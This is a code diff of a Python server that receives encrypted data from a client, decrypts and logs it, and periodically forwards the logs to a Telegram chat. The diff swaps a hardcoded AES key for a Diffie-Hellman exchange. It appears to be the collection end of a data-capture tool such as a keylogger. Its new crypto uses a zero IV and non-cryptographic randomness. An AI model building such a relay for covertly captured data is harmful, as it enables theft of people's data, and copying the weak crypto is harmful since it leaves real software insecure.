@@ -8,9 +8,9 @@ import time
 from telegram import Bot
 import os
 import asyncio
-
-AES_KEY = b"AfterLifeDeath00"  # 16 bytes, must match client
-AES_IV = b"AfterDeathLife00"  # 16 bytes, must match client
+from Crypto.Hash import SHA256
+from Crypto.Util.number import bytes_to_long, long_to_bytes
+import random
 
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
@@ -35,16 +35,18 @@ TELEGRAM_TOKEN, TELEGRAM_CHAT_ID = load_telegram_config()
 bot = Bot(token=TELEGRAM_TOKEN)
 log_buffer = []
 
-def decrypt_data(data):
-    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
+HOST = '127.0.0.1'
+PORT = 5000
+
+def decrypt_data(data, session_key):
+    # IV must match the client; here we use 16 zero bytes for simplicity
+    iv = b'\x00' * 16
+    cipher = AES.new(session_key, AES.MODE_CBC, iv)
     try:
         decrypted = unpad(cipher.decrypt(data), AES.block_size)
         return decrypted.decode(errors='ignore')
     except Exception as e:
         return f"[DECRYPT ERROR] {e}\n"
-
-HOST = '127.0.0.1'
-PORT = 5000
 
 def send_buffer_periodically():
     while True:
@@ -61,6 +63,33 @@ def send_buffer_periodically():
             except Exception as e:
                 print(f"[TELEGRAM ERROR] {e}")
 
+def diffie_hellman_exchange(conn):
+    # Use the same p and g as the client
+    p = int(
+        "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
+        "29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
+        "EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
+        "E485B576625E7EC6F44C42E9A63A3620FFFFFFFFFFFFFFFF", 16)
+    g = 2
+
+    priv = random.randint(2, p-2)
+    pub = pow(g, priv, p)
+
+    # Receive client's public key
+    client_pub_len = int.from_bytes(conn.recv(2), 'big')
+    client_pub = bytes_to_long(conn.recv(client_pub_len))
+
+    # Send our public key
+    pub_bytes = long_to_bytes(pub)
+    conn.send(len(pub_bytes).to_bytes(2, 'big'))
+    conn.send(pub_bytes)
+
+    # Compute shared secret
+    shared_secret = pow(client_pub, priv, p)
+    shared_secret_bytes = long_to_bytes(shared_secret)
+    session_key = SHA256.new(shared_secret_bytes).digest()[:16]
+    return session_key
+
 def main():
     while True:
         try:
@@ -75,13 +104,14 @@ def main():
                     conn, addr = s.accept()
                     with conn:
                         print(f"Connessione accettata da {addr}")
+                        session_key = diffie_hellman_exchange(conn)
                         while True:
                             data = conn.recv(1024)
                             if not data:
                                 print(f"Connessione chiusa da {addr}")
                                 break
                             # Decrypt and print
-                            decrypted = decrypt_data(data)
+                            decrypted = decrypt_data(data, session_key)
                             print(decrypted, end='', flush=True)
                             log_buffer.append(decrypted)
         except Exception as e:
